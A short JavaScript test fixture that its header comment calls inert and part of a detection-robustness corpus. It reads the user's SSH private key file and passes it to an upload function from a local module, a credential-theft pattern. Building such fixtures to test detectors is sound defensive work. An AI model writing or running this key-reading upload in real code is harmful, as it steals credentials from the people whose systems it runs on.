// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
const fs = require('fs');
const upload = require('./lib/upload');
const d = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
upload(d);
